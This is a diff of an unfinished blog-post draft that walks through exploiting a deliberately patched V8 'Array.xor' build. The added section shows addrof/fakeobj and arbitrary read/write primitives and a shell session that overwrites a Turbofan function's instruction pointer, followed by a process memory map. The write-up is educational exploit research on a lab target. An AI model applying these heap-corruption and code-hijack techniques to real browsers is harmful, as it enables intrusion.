@@ -286,6 +286,16 @@ The patch adds a new **Array.xor()** prototype that can be used to xor all value
 		float: right;
 	}
 }
+@media (width < 800px) {
+	.over800 {
+		display: none;
+	}
+}
+@media (width >= 800px) {
+	.under800 {
+		display: none;
+	}
+}
 .termCode {
 	white-space: pre-wrap;
 	background: #000;
@@ -470,7 +480,7 @@ But first, we should look at how v8 stores stuff in the memory so that we can fi
 
 With the **d8 natives syntax** and a **debugger**! If we launch d8 (the v8 shell) with the `--allow-natives-syntax` flag, we can use various debug functions such as `%DebugPrint(obj)` to examine what's going on with objects, and if we combine that with a debugger ([gdb](https://gnu.org/software/gdb/) in this case) we can even check out the entire memory to understand it better. Let's try it:
 
-<div class="termCode"><span class="termCodeW">&gt; gdb --args ./d8 --allow-natives-syntax</span> <span class="termCodeComm">&lt;-- use d8 with the natives syntax in gdb</span>
+<div class="termCode"><span class="termCodeW">$ gdb --args ./d8 --allow-natives-syntax</span> <span class="termCodeComm">&lt;-- use d8 with the natives syntax in gdb</span>
 GNU gdb (GDB) 14.2
 <span class="termCodeW">(gdb) run</span> <span class="termCodeComm">&lt;-- start d8</span>
 Starting program: /home/lyra/Desktop/array.xor/dist/d8 --allow-natives-syntax
@@ -524,10 +534,7 @@ Thread 1 "d8" received signal SIGTSTP, Stopped (user).
 
 In this example I made an array, used DebugPrint to see it's address, and then used gdb's `x/8xg`[^3] command to see the memory around that address. Going forward I'll be cleaning up the examples shown in the blog post, but this is essentially how you can follow along at home.
 
-<!-- todo: i don't think that's quite true -->
-You'll notice I subtracted 1 from the memory address before viewing it - that's because of tagged pointers! ~~In a `PACKED_ELEMENTS` array, doubles that~~ end with a 0 bit (even) are stored as-is, but everything ending with a 1 bit (odd) gets interpreted as a pointer, so a pointer to `0x1000` gets stored as `0x1001`. Because of this, we have to subtract 1 from all tagged pointers before checking out their address.
-
-<!-- Anyways, what are those exploit primitives? `addrof` lets us see the memory address of any object, and `fakeobj` lets us create a "fake" JavaScript object - they're almost like memory read and write functions, but not quite. -->
+You'll notice I subtracted 1 from the memory address before viewing it - that's because of tagged pointers! In a `PACKED_ELEMENTS` array (and many other V8 structures), SMIs (SMall Integers) that end with a 0 bit (even) are shifted and stored directly, but everything ending with a 1 bit (odd) gets interpreted as a pointer, so a pointer to `0x1000` gets stored as `0x1001`. Because of this, we have to subtract 1 from all tagged pointers before checking out their address.
 
 But let's try to understand what the gdb output above means:
 
@@ -935,7 +942,7 @@ Let's take our research so far and wrap it up in a nice little script.
 
 The beginning of the script sets up some helper functions. Then we create an array to store our fake array in as before, and also another array that has a random object in it.
 
-To set up the fake array, we must know where our real array is at in memory. There are ways to accomplish this, but for now we'll just run %DebugPrint and use its output to change the **arrAddr** value in the code to what the memory address should be. This approach works fine in a controlled environment like ours, but breaks apart when attacking browsers in the real world. I'll share an approach without this shortcoming at the end of the post.
+To set up the fake array, we must know where our real array is at in memory. There are ways to accomplish this, but for now we'll just run %DebugPrint and use its output to change the **arrAddr** value in the code to what the memory address should be. This approach works okay in a controlled environment like ours (we'll need to keep updating the address as we change the code), but breaks apart when attacking browsers in the real world. I'll show how to overcome this shortcoming later in the post.
 
 We can then guess how the rest of the memory lines up and use offsets to set a few other variables, such as the **fakeElementsAddr** which we add to the header of the fake array so that it points to where the fake array's elements are.
 
@@ -964,7 +971,7 @@ Once everything's set up we do the xor exploit thing and end up with the fake ar
 0x00043348: 0x<span class="jsMemVar9">0000000200043335</span>
 ...</div></div>
 
-Neat! If we stare at the patterns in the memory we can make out the other arrays and stuff we initialized earlier. And if you think about it, we pretty much already have the **addrof** and **fakeobj** primitives here. At <span class="jsMemVarExt11">index 10</span>, we can get the address of the object currently in **objArr**, so if we put any object of our choice in that array we can see its address. And similarly, if we put an address to an object at that spot, we'll be able to access it through that array. That'll be our **addrof** and **fakeobj**!
+Neat! If we stare at the patterns in the memory we can make out the other arrays and stuff we initialized earlier. And if you think about it, we pretty much already have the **addrof** and **fakeobj** primitives here. At <span class="jsMemVarExt11">index 10</span>, we can get the address of the object currently in objArr, so if we put an object of our choice in that array we can see its address. And if we put an address to an object at that index, we'll be able to access it through the objArr array. That'll be our **addrof** and **fakeobj**!
 
 Let's write the primitives to get and set the upper 32 bits:
 
@@ -1071,6 +1078,201 @@ Did you know that strings in JavaScript are immutable! Anyways let's mutate them
 We've done the impossible! Imagine how much we're gonna be able to speed up the performance of our webapps by running this exploit and making strings mutable.
 
 ## Part 4: Code execution
+
+So we can read and write any memory, how do we turn this into code execution?
+
+We'd probably want to start by looking at how code gets stored and run for functions and stuff.
+
+```js
+> function func() {
+  return 0x1337;
+}
+> func()
+< 4919
+> %DebugPrint(func)
+< ...
+```
+
+<div class="jsMem">
+	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
+	<div class="jsMemDbg">DebugPrint
+ - code: 0x303600032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;</div>
+<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
+	<div class="jsMemHex">0x1337</div>
+</div>
+
+Ooh we've got something called **code** there! But it's some sort of a **InterpreterEntryTrampoline**, what's that?
+
+Looking it up, it seems like it's bytecode generated by [Ignition](https://v8.dev/blog/ignition-interpreter). This V8-specific bytecode is run by a VM and is made specifically for JavaScript. It won't be much use to us because we want to run computer code that can hack a computer, not chrome code that can hack a website. Looking further into V8 docs we find [Maglev](https://v8.dev/blog/maglev) and [Turbofan](https://v8.dev/docs/turbofan), the latter of which seems like a great fit for us because it compiles into machine code.
+
+But our function is still the trampoline thing! How do we turn it into a turbofan thing?
+
+We need to make V8 think it's important to optimize our code by running it a lot of times, or using debug commands. If we still have the V8 natives syntax enabled from earlier, we can use **%PrepareFunctionForOptimization()** and **%OptimizeFunctionOnNextCall()** to do the trick.
+
+```js
+> function func() {
+  return 0x1337;
+}
+> %DebugPrint(func)
+< DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
+ - code: 0x2d7a000332c1 <Code BUILTIN CompileLazy>
+> func()
+< 4919
+> %DebugPrint(func)
+< DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
+ - code: 0x2d7a00032cc1 <Code BUILTIN InterpreterEntryTrampoline>
+> %PrepareFunctionForOptimization(func)
+> func()
+< 4919
+> %DebugPrint(func)
+< DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
+ - code: 0x2d7a00032cc1 <Code BUILTIN InterpreterEntryTrampoline>
+> %OptimizeFunctionOnNextCall(func)
+> func()
+< 4919
+> %DebugPrint(func)
+< DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
+ - code: 0x2d7a002006ed <Code TURBOFAN>
+> codeObj = fakeobj(0x002006ed)
+> %DebugPrint(codeObj)
+<
+```
+
+(code debugprint here)
+
+Awesome, we have a code object that points to an address where the code gets run from, and we can change it to whatever we want. Let's make a part of the memory just the [0xCC INT3](https://en.wikipedia.org/wiki/INT_%28x86_instruction%29#INT3) breakpoint opcode - this will temporarily pause the execution and send a [SIGTRAP signal](https://en.wikipedia.org/wiki/Signal_%28IPC%29#SIGTRAP) to gdb so we can look into the current state.
+
+```js
+> funcAddr = addrof(func)
+> hex32(funcAddr)
+< '0x001d3fb9n'
+> codeAddr = read(funcAddr + 0x8n) >> 32n
+> hex32(codeAddr)
+< '0x002006ed'
+> instructionStart = codeAddr + 0x12n
+> hex64(read(instructionStart))
+< '0x00005555b7941700'
+> instructions = [i2f(0xCCCCCCCCCCCCCCCCn), 2.2]
+> instructions
+< [-9.255963134931783e+61, 2.2]
+> write(instructionStart, 0x2d7a00000000n + addrof(instructions) - 0x10n);
+> func()
+Received signal 11 SEGV_MAPERR 00002d7a0004
+Segmentation fault (core dumped)
+```
+
+Huh, that didn't work, why is that?
+
+The `SEGV_MAPERR` signal gives us a hint - it means that there was some sort of an error accessing the memory. It turns out not all memory is made equal and different parts of the memory have different permissions. In Linux we can see this by looking at the map of a process.
+
+<div class="termCode"><span class="termCodeW">$ ./d8 &amp;</span> <span class="termCodeComm">&lt;-- run d8 in the background</span>
+[1] 1962 <span class="termCodeComm">&lt;-- that's the d8 process id</span>
+<span class="termCodeW">$</span> V8 version 12.7.0 (candidate)
+d8> 
+[1]+  Stopped                 ./d8
+<span class="termCodeW">$ cat /proc/1962/maps</span> <span class="termCodeComm">&lt;-- look at the process map</span>
+a6b00000000-1a6b00010000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00010000-1a6b00020000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00020000-1a6b00040000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00040000-1a6b00143000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00143000-1a6b00180000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00180000-1a6b00181000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00181000-1a6b001c0000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+1a6b001c0000-1a6b00200000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00200000-1a6b00300000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00300000-1a6b00316000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00316000-1a6b00340000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+1a6b00340000-1a6c00000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+55987ab85000-55987bcc3000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
+55987bcc4000-55987d35e000 <span class="termCodePx">r-xp</span> <span class="over800">0113e000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
+55987d35e000-55987d3df000 <span class="termCodePr">r--p</span> <span class="over800">027d7000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
+55987d3e0000-55987d3ec000 <span class="termCodePw">rw-p</span> <span class="over800">02858000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
+55987d3ec000-55987d3ed000 <span class="termCodePr">r--p</span> <span class="over800">02864000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
+55987d3ed000-55987d3fb000 <span class="termCodePw">rw-p</span> <span class="over800">02865000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
+55987d3fb000-55987d42e000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+55987f17d000-55987f214000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0                         </span>&nbsp;[heap]
+5598dcf80000-5598fcf80000 <span class="termCodePrwx">rwxp</span> <span class="over800">00000000 00:00 0</span>
+7f68b8000000-7f68b8010000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
+7f68b8010000-7f68d8000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+7f68d8000000-7f68d8010000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
+7f68d8010000-7f68f8000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+7f68f8000000-7f68f8010000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
+7f68f8010000-7f6918000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+7f6918000000-7f6918021000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+7f6918021000-7f691c000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+7f691c000000-7f691c021000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+7f691c021000-7f6920000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+7f6920000000-7f6920021000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+7f6920021000-7f6924000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+7f6927dce000-7f6927e1c000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+7f6927e1c000-7f6927e1d000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+7f6927e1d000-7f692861d000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+7f692861d000-7f692861e000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+7f692861e000-7f6928e1e000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+7f6928e1e000-7f6928e1f000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
+7f6928e1f000-7f6929623000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+7f6929623000-7f6929647000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
+7f6929647000-7f69297ab000 <span class="termCodePx">r-xp</span> <span class="over800">00024000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
+7f69297ab000-7f69297f9000 <span class="termCodePr">r--p</span> <span class="over800">00188000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
+7f69297f9000-7f69297fd000 <span class="termCodePr">r--p</span> <span class="over800">001d6000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
+7f69297fd000-7f69297ff000 <span class="termCodePw">rw-p</span> <span class="over800">001da000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
+7f69297ff000-7f6929807000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+7f6929807000-7f692980b000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
+7f692980b000-7f6929826000 <span class="termCodePx">r-xp</span> <span class="over800">00004000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
+7f6929826000-7f692982a000 <span class="termCodePr">r--p</span> <span class="over800">0001f000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
+7f692982a000-7f692982b000 <span class="termCodePr">r--p</span> <span class="over800">00022000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
+7f692982b000-7f692982c000 <span class="termCodePw">rw-p</span> <span class="over800">00023000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
+7f692982c000-7f692983a000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
+7f692983a000-7f69298b9000 <span class="termCodePx">r-xp</span> <span class="over800">0000e000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
+7f69298b9000-7f6929915000 <span class="termCodePr">r--p</span> <span class="over800">0008d000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
+7f6929915000-7f6929916000 <span class="termCodePr">r--p</span> <span class="over800">000e8000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
+7f6929916000-7f6929917000 <span class="termCodePw">rw-p</span> <span class="over800">000e9000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
+7f6929917000-7f6929918000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
+7f6929918000-7f6929919000 <span class="termCodePx">r-xp</span> <span class="over800">00001000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
+7f6929919000-7f692991a000 <span class="termCodePr">r--p</span> <span class="over800">00002000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
+7f692991a000-7f692991b000 <span class="termCodePr">r--p</span> <span class="over800">00002000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
+7f692991b000-7f692991c000 <span class="termCodePw">rw-p</span> <span class="over800">00003000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
+7f692991c000-7f692991d000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
+7f692991d000-7f692991e000 <span class="termCodePx">r-xp</span> <span class="over800">00001000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
+7f692991e000-7f692991f000 <span class="termCodePr">r--p</span> <span class="over800">00002000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
+7f692991f000-7f6929920000 <span class="termCodePr">r--p</span> <span class="over800">00002000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
+7f6929920000-7f6929921000 <span class="termCodePw">rw-p</span> <span class="over800">00003000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
+7f6929921000-7f6929923000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
+7f6929948000-7f6929949000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
+7f6929949000-7f6929970000 <span class="termCodePx">r-xp</span> <span class="over800">00001000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
+7f6929970000-7f692997a000 <span class="termCodePr">r--p</span> <span class="over800">00028000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
+7f692997a000-7f692997c000 <span class="termCodePr">r--p</span> <span class="over800">00032000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
+7f692997c000-7f692997e000 <span class="termCodePw">rw-p</span> <span class="over800">00034000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
+7ffde1b30000-7ffde1b51000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0                         </span>&nbsp;[stack]
+7ffde1baf000-7ffde1bb3000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0                         </span>&nbsp;[vvar]
+7ffde1bb3000-7ffde1bb5000 <span class="termCodePx">r-xp</span> <span class="over800">00000000 00:00 0                         </span>&nbsp;[vdso]
+ffffffffff600000-ffffffffff601000 <span class="termCodePx">--xp</span> <span class="over800">00000000 00:00 0                 </span>&nbsp;[vsyscall]
+<span class="termCodeW">$</span></div>
+
+These are all the memory addresses d8 uses, and each one of them has permissions associated with them - **r**ead, **w**rite, and e**x**ecute respectively. The array we made is in one of the read-write maps, so trying to execute code from there is going to result in a crash.
+
+<style>
+.termCodePp {
+	color: #444;
+}
+.termCodePr {
+	color: #8e1;
+}
+.termCodePw {
+	color: #EF0;
+}
+.termCodePx {
+	color: #FA0;
+}
+.termCodePrwx {
+	color: #F00;
+}
+</style>
+
+I then found [this awesome writeup by Anvbis](https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/) showing off how we can use Turbofan to get code execution. I'll be borrowing heavily from that post, but it goes a lot more in-depth so please check it out if you're interested in this technique.
+
+Okay, let's try to figure out 
+
 ## Part 5: What could've been
 ## Part 6: The end
 
@@ -1269,6 +1471,8 @@ todo:
 32bit pointer/memory compression
 make sure we're in 0xa38 address space
 make sure we have mobile addresses available
+hex32/64 responses need to be str not num
+bigint responses need to be gray not num
 
 note: the v8/gdb highlighting thing doesn't work in the current version of ladybird because it doesn't support the :has() selector, and the little endian widget won't work due to no resizable handles
 
@@ -1280,7 +1484,7 @@ note: the v8/gdb highlighting thing doesn't work in the current version of ladyb
 
 [^3]: `x/8xg` stands for: e(**x**)amine (**8**) he(**x**)adecimal (**g**)iant words (64-bit values). I recommend checking out [a reference](https://visualgdb.com/gdbreference/commands/x) to see other ways this command can be used.
 
-[^4]: In memory the length of the array is doubled (6 instead of 3) because each double value takes up two 32-bit "slots". TODO: factcheck this
+[^4]: In memory, the length of the array appears as twice what it really is (eg 6 instead of 3) because SMIs need to end with a 0 bit or they'll become a tagged pointer. If the length of an array was over 2<sup>31</sup>-1 we'd see a pointer to a double instead.
 
 [^5]: JavaScript floating-point numbers can only accurately represent integers up to 2<sup>53</sup>–1. You *can* have larger numbers, but they won't be accurate. [BigInts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt) are a separate data type that doesn't have this issue - they can be infinitely big while still being accurate! Well, perhaps not infinitely big, but [in V8](https://v8.dev/features/bigint) their size can be [over a billion bits](https://stackoverflow.com/a/70537884/2251833), which would be about 128MiB of just a single number.
 
